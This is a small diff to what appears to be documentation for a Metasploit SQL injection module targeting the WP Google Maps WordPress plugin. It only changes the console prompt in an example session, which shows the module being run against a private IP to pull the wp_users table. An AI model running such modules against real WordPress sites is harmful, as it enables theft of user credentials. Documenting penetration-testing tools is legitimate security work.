@@ -23,7 +23,7 @@ Change the table prefix. By default, this option is set to `wp_`.
 ### wp-google-maps 7.11.17 on WordPress 4.9.5
 
 ```
-msf5 auxiliary(admin/http/wp_google_maps_sqli) > exploit
+msf auxiliary(admin/http/wp_google_maps_sqli) > exploit
 [*] Running module against 172.22.222.144
 
 [*] 172.22.222.144:80 - Trying to retrieve the wp_users table...
